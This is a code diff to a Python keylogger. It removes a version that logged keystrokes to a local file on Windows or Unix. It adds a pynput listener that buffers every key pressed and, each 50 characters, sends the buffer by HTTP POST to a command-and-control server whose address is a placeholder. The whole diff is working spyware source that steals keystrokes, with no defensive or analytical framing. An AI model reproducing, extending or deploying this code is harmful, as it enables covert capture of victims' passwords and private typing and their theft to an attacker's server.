@@ -10,32 +10,34 @@
 
 import os
 import time
+import requests
+from pynput import keyboard
 
-def start_keylogger(log_file_path):
-    if os.name == 'nt':
-        # Implement Windows keylogger logic
-        import pyHook, pythoncom
+C2_URL = "http://C2_IP_OR_URL:8080/receive_keystrokes"
 
-        def OnKeyboardEvent(event):
-            with open(log_file_path, 'a') as f:
-                f.write(chr(event.Ascii))
-            return True
+log = ""
 
-        hm = pyHook.HookManager()
-        hm.KeyDown = OnKeyboardEvent
-        hm.HookKeyboard()
-        pythoncom.PumpMessages()
-    elif os.name == 'posix':
-        # Implement Linux/MacOS keylogger logic
-        from pynput import keyboard
+def send_to_c2(log):
+    try:
+        response = requests.post(C2_URL, json={"keystrokes": log})
+        if response.status_code == 200:
+            print("Keystrokes successfully sent to C2 server.")
+        else:
+            print(f"Failed to send keystrokes to C2 server. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending keystrokes to C2 server: {e}")
 
-        def on_press(key):
-            with open(log_file_path, 'a') as f:
-                f.write(str(key) + '\n')
+def on_press(key):
+    global log
+    log += str(key)
+    
+    if len(log) >= 50:  # adjust this threshold as needed
+        send_to_c2(log)
+        log = ""
 
-        with keyboard.Listener(on_press=on_press) as listener:
-            listener.join()
+def start_keylogger():
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
 if __name__ == "__main__":
-    log_file_path = "/path/to/log_file"
-    start_keylogger(log_file_path)
+    start_keylogger()
